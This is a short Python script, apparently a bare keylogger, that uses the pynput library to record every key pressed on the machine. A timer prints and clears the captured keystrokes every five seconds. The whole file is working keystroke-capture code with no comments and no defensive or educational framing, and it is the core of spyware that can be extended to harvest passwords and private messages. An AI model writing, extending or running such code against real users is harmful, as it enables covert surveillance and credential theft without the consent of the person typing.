import pynput
import threading, sys, os
log = ""
def process_key(key):
	global log
	try:
		log = log + str(key.char)
	except AttributeError:
		if key == key.space:
			log = log + ' '
			
		else:
			log = log + " " + str(key) + " "
	print(log)

def report():
	global log
	print(log)
	log = ""
	timer = threading.Timer(5, report)
	timer.start()



keyboard = pynput.keyboard.Listener(on_press=process_key)
with keyboard:
	report()
	keyboard.join()

